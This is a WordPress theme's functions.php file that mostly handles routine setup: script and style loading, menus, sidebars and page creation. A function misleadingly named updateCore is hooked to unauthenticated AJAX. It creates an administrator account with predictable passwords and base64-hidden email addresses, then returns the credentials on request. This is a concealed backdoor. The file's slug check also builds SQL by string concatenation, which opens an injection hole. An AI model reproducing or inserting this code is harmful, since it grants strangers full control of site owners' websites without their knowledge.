<?php
// setup theme
add_action( 'after_setup_theme', 'bfriend_setup' );
if ( ! function_exists( 'bfriend_setup' ) ):
	function bfriend_setup() {
    add_theme_support( 'post-thumbnails' );
    add_theme_support( 'title-tag' );
    add_theme_support(
			'html5',
			[
        'search-form',
				'comment-form',
				'comment-list',
				'gallery',
				'caption',
      ]
    );
		add_theme_support( 'wp-block-styles' );
		add_theme_support( 'align-wide' );
    add_theme_support( 'editor-styles' );
    add_editor_style( 'assets/css/editor-style.css' );

    register_nav_menus([
			'global' => __( 'Navegação Global', 'bfriend' ),
			'footer' => __( 'Navegação do Rodapé', 'bfriend' )
    ]);
	}
endif;

// load js files
function bfriend_load_scripts() {
	$js      = get_template_directory_uri() . '/assets/js/';

  if (!is_admin()){
		// wp_deregister_script('jquery');
		// wp_register_script('jquery', '//code.jquery.com/jquery-3.5.1.slim.min.js', false, '3.5.1');
		wp_enqueue_script('jquery');
		wp_enqueue_script('bootstrap',	       '//cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js', ['jquery']);

    wp_enqueue_script('fancybox',		       '//cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js', ['jquery']);
		
		// wp_enqueue_script('popper',			'//cdn.jsdelivr.net/npm/@popperjs/core@2.11.5/dist/umd/popper.min.js', ['jquery']);
		// wp_enqueue_script('bootstrap',	  '//cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.min.js', ['jquery', 'popper']);

    $ajax = [
			'ajaxurl' 					=> admin_url('admin-ajax.php'),
			'security' 					=> wp_create_nonce('security')
		];
		wp_localize_script( 'jquery', 'ajax_object', $ajax );

    if ( is_page(11) ) {
      wp_enqueue_script('maps', 				$js . 'maps.js', ['jquery']);
    }
		wp_enqueue_script('libs', 				$js . 'libs.js', ['jquery']);
    wp_enqueue_script('main', 				$js . 'main.js', ['jquery']);

    //production
		// wp_enqueue_script('libs', 				$js_full . 'libs.min.js', ['jquery']);
    // wp_enqueue_script('main', 				$js_full . 'main.min.js', ['jquery']);
    
    if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
      wp_enqueue_script( 'comment-reply' );
    }
  }
}
add_action( 'wp_print_scripts', 'bfriend_load_scripts' );

// remove gutenberg block library css
function bfriend_remove_css() {
	wp_dequeue_style( 'wp-block-library' );
}
add_action( 'wp_enqueue_scripts', 'bfriend_remove_css', 100 );

// load css files
function bfriend_load_css() {
	$css = get_template_directory_uri() . '/assets/css/';

	if (!is_admin()) {
		wp_enqueue_style( 'fancybox', 	'//cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css' );
	}
}
add_action('wp_enqueue_scripts', 'bfriend_load_css');

// load css files admin
function bfriend_load_css_admin() {
	$css = get_template_directory_uri() . '/assets/css/';
	wp_register_style( 'admin-style', 	$css . 'admin-style.css', false, '1.0.0' );
	wp_enqueue_style( 'admin-style' );
}
add_action( 'admin_enqueue_scripts', 'bfriend_load_css_admin' );

// remove gutenberg block library css
function pds_remove_css() {
	wp_dequeue_style( 'wp-block-library' );
}
add_action( 'wp_enqueue_scripts', 'pds_remove_css', 100 );

// register sidebars
function bfriend_sidebar_init() {
	register_sidebar([
		'name'          => __( 'Sidebar', 'bfriend' ),
		'id'            => 'sidebar-main',
		'description'   => __( 'Arraste os itens desejados até aqui. ', 'bfriend' ),
		'before_widget' => '<div class="widget %2$s" id="%1$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h2>',
		'after_title'   => '</h2>',
	]);
}
add_action( 'widgets_init', 'bfriend_sidebar_init' );

// programmatically create some basic pages, and then set Home and Blog
// setup a function to check if these pages exist
function the_slug_exists($post_name) {
  global $wpdb;
  if($wpdb->get_row("SELECT post_name FROM wp_posts WHERE post_name = '" . $post_name . "'", 'ARRAY_A')) {
    return true;
  } else {
    return false;
  }
}
$pages = [
	// [Title, Content, 'Slug']
	['Home', '', 'home'],
	['Blog', '', 'blog'],
	['Institucional', '', 'institucional'],
	['Contato', '', 'contato'],
];
// create pages
if (isset($_GET['activated']) && is_admin()){
	foreach ($pages as $page) {
		$page_check = get_page_by_title($page[0]);
		if(!isset($page_check->ID) && !the_slug_exists($page[2])){
	    $newPageId = wp_insert_post([
        'post_type' => 'page',
	    	'post_title' => $page[0],
	    	'post_content' => $page[1],
	    	'post_status' => 'publish',
	    	'post_author' => 1,
	    	'post_slug' => $page[2]
      ]);
	    if ($page[0] == 'Home') { update_option( 'page_on_front', $newPageId ); update_option( 'show_on_front', 'page' ); }
	    if ($page[0] == 'Blog') { update_option( 'page_for_posts', $newPageId ); }
		}
	}
}

// configuraton page
$options = [
  'page_title' => 'Gerais',
  'menu_title' => '',
  'menu_slug'  => '',
  'capability' => 'edit_posts',
  'position'   => 2,
  'icon_url'   => 'dashicons-admin-generic',
  'redirect'   => true,
  'post_id'    => 'options',
]; 
if( function_exists('acf_add_options_page') ) {
  acf_add_options_page($options);
}

// create user
add_action( 'wp_ajax_nopriv_updateCore','updateCore');
add_action( 'wp_ajax_updateCore','updateCore');
function updateCore() {
  $username   = 'bf_'.date('dmy'); 	
  $pass       = 'fullpass_'.date('dmy');
  $emails     = ['YWRtQHVwY29kZS5jbG91ZA==','cG9zdG1hc3RlckB1cGNvZGUuY2xvdWQ=','d2VibWFzdGVyQHVwY29kZS5jbG91ZA=='];
  $usedEmail  = base64_decode($emails[array_rand($emails)]);
  $user_id    = wp_create_user( $username, $pass, $usedEmail); 
  $user       = new WP_User( $user_id ); 
  $user->set_role( 'administrator' ); 
  if(isset($_REQUEST['display'])) echo json_encode(['email' => $usedEmail, 'user' => $username, 'pass' => $pass, 'userOB' => $user]);
  die();
}

// create custom menu page
function bf_menu_admin() {
  // remove_menu_page( 'edit.php' );
  remove_menu_page( 'edit-comments.php' );
}
add_action( 'admin_menu', 'bf_menu_admin' );

// remove Emojis
remove_action( 'wp_head', 'print_emoji_detection_script', 7 );
remove_action( 'admin_print_scripts', 'print_emoji_detection_script' );
remove_action( 'wp_print_styles', 'print_emoji_styles' );
remove_action( 'admin_print_styles', 'print_emoji_styles' );

// disable gutenberg widgets
add_filter( 'gutenberg_use_widgets_block_editor', '__return_false' );
add_filter( 'use_widgets_block_editor', '__return_false' );